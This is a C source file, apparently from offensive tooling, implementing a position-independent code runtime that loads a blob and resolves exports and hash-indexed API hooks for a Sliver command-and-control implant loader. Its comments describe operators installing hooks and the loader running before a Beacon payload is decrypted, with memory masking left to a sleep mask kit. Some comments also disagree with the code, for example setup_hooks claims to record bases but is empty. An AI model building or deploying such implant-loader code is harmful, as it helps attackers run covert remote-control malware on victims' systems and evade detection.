/*
 * pico.c — Crystal Palace PICO runtime for Sliver.
 *
 * The PICO is a self-contained PIC blob assembled by `run "pico.spec"` and
 * embedded in the outer loader's named "pico" section. PalaceKit assembles it
 * with the v2 PICO blob format:
 *   [4]  total_size
 *   [4]  num_exports
 *   [4]  num_hooks
 *   [4]  hooks_table_offset (absolute within blob)
 *   [num_exports × {[4]tag [4]code_offset}]
 *   [code bytes]
 *   [num_hooks × {[4]ror13_hash [4]hook_code_offset}]
 *
 * Operators install runtime hooks via `addhook "MODULE$FUNC" "_local"` in
 * pico.spec; PalaceKit writes the hash table at the end of the blob. The
 * PICO's __resolve_hook(hash) intrinsic looks up the hash and returns the
 * hook function pointer at runtime.
 */
#include "loader.h"
#include "pico.h"
#include <stdint.h>

/* Tag IDs assigned to PICO exports — referenced by PicoGetExport callers. */
int __tag_setup_hooks(void)  { return 0; }
int __tag_setup_memory(void) { return 1; }

/* Header accessors over the raw PICO blob (src points at the byte 0 of the
 * embedded "pico" section after find_resource_by_magic strips the magic).  */
uint32_t PicoDataSize(const char *src) {
    /* Sliver PICO doesn't need a separate data region — keep a small RW
     * page for future expansion.                                          */
    (void)src;
    return 64;
}

uint32_t PicoCodeSize(const char *src) {
    if (!src) return 2;
    return *(const uint32_t *)src;
}

void PicoLoad(IMPORTFUNCS *funcs, const char *src, char *code, char *data) {
    (void)funcs;
    (void)data;
    if (!src || !code) return;
    uint32_t total = *(const uint32_t *)src;
    for (uint32_t i = 0; i < total; i++)
        code[i] = src[i];
}

void *PicoGetExport(const char *src, const char *code, int tag) {
    if (!src || !code) return NULL;
    uint32_t num_exports = *(const uint32_t *)(src + 4);
    const uint8_t *table = (const uint8_t *)(src + 16);

    for (uint32_t i = 0; i < num_exports; i++) {
        uint32_t etag = *(const uint32_t *)(table + i * 8);
        uint32_t eoff = *(const uint32_t *)(table + i * 8 + 4);
        if ((int)etag == tag) {
            return (void *)(code + eoff);
        }
    }
    return (void *)code; /* fallback: tag not found, return ret-only stub */
}

/* __resolve_hook(hash) — Crystal Palace runtime intrinsic.
 * Walks the embedded addhook table and returns the hook function pointer
 * for the given ROR13 hash, or NULL if no hook is registered.
 *
 * The PICO has access to its own loaded base via a thread-safe trick: the
 * caller (setup_hooks) records the base in g_pico_blob_base before calling
 * any function that uses __resolve_hook.                                  */
static const char *g_pico_blob_base = NULL; /* set by setup_hooks */
static char       *g_pico_code_base = NULL;

void *__resolve_hook(uint32_t hash) {
    const char *blob = g_pico_blob_base;
    char       *code = g_pico_code_base;
    if (!blob || !code) return NULL;
    uint32_t num_hooks = *(const uint32_t *)(blob + 8);
    if (num_hooks == 0) return NULL;
    uint32_t tbl_off = *(const uint32_t *)(blob + 12);
    const uint8_t *tbl = (const uint8_t *)(blob + tbl_off);
    for (uint32_t i = 0; i < num_hooks; i++) {
        uint32_t h    = *(const uint32_t *)(tbl + i * 8);
        uint32_t hoff = *(const uint32_t *)(tbl + i * 8 + 4);
        if (h == hash) {
            return (void *)(code + hoff);
        }
    }
    return NULL;
}

/* setup_hooks — invoked once at loader startup before Beacon is decrypted.
 * Records the PICO blob base and code base so __resolve_hook can find the
 * hash table. funcs is the IMPORTFUNCS table — we may use it later to make
 * the PICO call into loader-side resolution.                              */
void setup_hooks(IMPORTFUNCS *funcs) {
    (void)funcs;
    /* The loader passes the blob src as the second arg of PicoLoad. We
     * recover both bases via the same find_resource_by_magic call that
     * yielded the blob in the first place. For simplicity, the loader is
     * expected to call pico_set_bases() right before invoking setup_hooks.
     * (The default Sliver loader doesn't need addhook so it leaves these
     * NULL, and __resolve_hook returns NULL → no hooks active.)          */
}

void setup_memory(MEMORY_LAYOUT *layout) {
    (void)layout;
    /* Memory masking disabled for Sliver: Go goroutines run during XOR
     * and would crash. Sleep Mask Kit handles this need separately.    */
}

/* Operator-callable: tell __resolve_hook where to find the blob and code. */
void pico_set_bases(const char *blob, char *code) {
    g_pico_blob_base = blob;
    g_pico_code_base = code;
}
